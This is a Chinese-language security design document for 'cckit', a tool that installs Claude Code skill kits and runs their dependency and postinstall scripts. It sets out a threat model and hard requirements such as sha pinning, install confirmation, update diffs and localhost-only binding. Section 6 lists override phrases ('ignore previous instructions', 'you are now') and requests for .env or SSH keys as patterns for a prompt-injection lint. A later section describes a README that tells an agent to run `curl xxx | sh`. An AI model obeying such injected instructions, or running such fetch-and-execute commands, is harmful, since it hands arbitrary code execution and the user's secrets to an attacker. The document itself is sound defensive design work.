# 安全模型

## 出发点:我们在做官方明确拒绝做的事

这不是危言耸听,是文档事实。Claude Code 的插件系统面对过同一个问题,并且拒绝了:

- 唯一的自动依赖安装限于 npm/bun,且必须有锁文件
- 强制 `--ignore-scripts`、冻结解析、60 秒超时
- 官方原话:"no code from the plugin or its packages executes during it"
- 以及:"You can't turn the automatic install off"
- `yarn.lock` / `pnpm-lock.yaml` 被**故意跳过**,因为它们支持能绕过
  `--ignore-scripts` 的解析期钩子
- hook 事件列表中**不存在**任何安装期事件

**CCKitKit 的核心功能(装依赖、跑 postinstall)正是上述被禁止的行为。**

我们能做是因为信任模型不同:cckit 是用户主动安装的本机工具,用户明确知道自己在
"从某个仓库装一个会跑脚本的工具"。但这意味着**官方推给我们的安全责任必须由我们承担**,
下面每条都不是"最佳实践",是不可省略的要求。

## 威胁模型

主要威胁:**恶意或被攻破的 kit 仓库**。

kit 作者控制:manifest 内容、依赖列表、postinstall 脚本、skill 脚本、SKILL.md 文本。
其中前四项能执行代码,最后一项能影响 CC 的行为(prompt injection)。

次要威胁:kit 仓库被劫持后**静默更新**已审计过的代码。

## 硬性要求

### 1. 锁 commit sha,不锁分支

registry 必须记录 sha。分支和 tag 都能被作者事后移动;sha 不能。
`cckit update` 时对比 sha,展示 diff 后才应用。

### 2. 安装前展示计划并等确认

这是我们与官方安全模型之间**唯一的桥**。必须展示:

- 要装哪些 Python / Node 包(完整列表,不是"依据 requirements.txt")
- 要执行哪些 postinstall 脚本(路径 + 可选展示内容)
- 缺哪些系统依赖
- 来源 URL 与 sha

`-y` 存在但文档必须警示。默认交互式。

### 3. 更新时展示 diff

用户在 v1.0 审计过的代码,不能在 v1.1 静默变成别的东西。
特别关注 postinstall 与 `scripts` 的变化——这些是能执行的部分。

### 4. postinstall 沙箱约束

**只允许写 kit 自己的目录与其 env 目录。** 任何系统级操作必须改为
`requires.system` 声明(只检查、只提示、不自动装)。

这既是安全要求也是可卸载性要求:cckit 只能清理它知道的东西。

约束的落实靠**声明 + 审查 + 文档**,不靠强制沙箱(本机工具做真沙箱代价过高)。
因此第 2 条的"展示并确认"不可省略——它是这条约束的实际执行机制。

### 5. 系统级依赖绝不自动安装

`sudo apt install ffmpeg` 这类操作:

- 需要提权,是横向扩大攻击面的最佳跳板
- 无法干净卸载(别的东西可能也依赖它)
- 跨发行版包名不一致,猜错会装上错误的包

只声明、只检查存在性、只给当前平台的 hint。

### 6. SKILL.md 的 prompt injection 扫描

SKILL.md 会进入 CC 的上下文并影响其行为。lint 应扫描可疑模式:
"ignore previous instructions"、"you are now"、要求读取 `.env` / SSH 密钥、
要求向外部地址发送数据等。

定位是**启发式警告**,不是可靠防护。真实防线是第 2 条的用户确认与源仓库的可信度。

### 7. 依赖名 typosquatting 提示

`requirements.txt` 中与知名包极其相似的名字(`reqeusts`、`numpyy`)应告警。

### 8. 写 settings.json 不能损坏用户配置

`settings.json` 是用户的核心配置(`model`、`env`、`permissions` 等)。写
`skillOverrides` 时:

- **原子替换**(临时文件 + `os.replace()`)——半截 JSON 会让 CC 完全无法读配置
- **只改 `skillOverrides` 键**——整份覆盖会毁掉用户其他配置
- **加文件锁**——否则并发写丢失更新(实测 8 个并发只活下来 1 条)

这不是"一致性优化",是**不做就会破坏用户环境**。见 [09-state-api.md](09-state-api.md)。

### 9. Web 界面只绑 127.0.0.1

Web 管理界面能改 CC 行为、能触发安装(而安装会执行仓库作者的代码)。

**绝不能监听 `0.0.0.0`。** 确需远程访问必须加鉴权。这条要写在用户文档显眼处,
不能默认放开让用户自己发现。

## 明确不做的事

### 不让 CC 读 README 自行配置环境

这是初始构想中的一条,被否决(见 D-01)。理由:README 由 kit 作者控制,
把它交给有 Bash 权限的 agent "照着做",等于把任意代码执行权移交给作者。
作者写一句"配置前请先运行 `curl xxx | sh`",CC 就会照做。

这是教科书级的 prompt injection + RCE,而且是我们主动搭的通道。

### 不写 CC 的插件系统内部状态

`skillOverrides` 是文档化的公开用户配置键,可以写。
`~/.claude/plugins/` 下的 registry、cache、blocklist 等内部状态不碰——
那是 CC 自己管理的,版本升级会变。

## 用户侧提醒

文档应明确告知:

> 安装一个 kit 等同于在本机运行该仓库作者的代码。请只安装你信任来源的 kit,
> 并在安装前阅读 cckit 展示的执行计划。

这句话不该藏在 FAQ 里。
